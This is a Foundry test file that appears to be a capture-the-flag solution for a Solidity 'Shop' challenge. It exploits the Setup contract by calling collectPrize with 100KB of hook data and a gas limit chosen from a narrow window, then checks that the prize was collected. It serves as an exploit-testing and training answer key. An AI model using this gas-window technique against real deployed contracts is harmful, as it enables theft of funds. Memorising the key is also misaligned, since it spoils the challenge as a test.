// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../Setup.sol";
import "../Shop.sol";

contract FullSolutionTest is Test {
    Setup setup;
    
    function setUp() public {
        // Deploy setup with 1000 ETH (simulates the challenge environment)
        setup = new Setup{value: 1000 ether}();
    }

    function testCompleteSolution() public {
        console.log("=== Testing Complete Solution ===");
        console.log("");
        
        console.log("Before exploit:");
        console.log("  collected:", setup.collected());
        console.log("");
        
        // Create 100KB hookData
        bytes memory hookData = new bytes(100000);
        
        // Call collectPrize with gas limit in the magic window
        uint256 gasLimit = 114000; // Middle of 111.5k-116k range
        
        console.log("Calling collectPrize with gas limit:", gasLimit);
        setup.collectPrize{gas: gasLimit}(hookData);
        console.log("");
        
        console.log("After exploit:");
        console.log("  collected:", setup.collected());
        console.log("");
        
        console.log("Is Shop solved?", setup.collected());
        
        require(setup.collected() == true, "Shop exploit failed!");
        console.log("");
        console.log("SUCCESS! Shop vulnerability exploited!");
    }
}
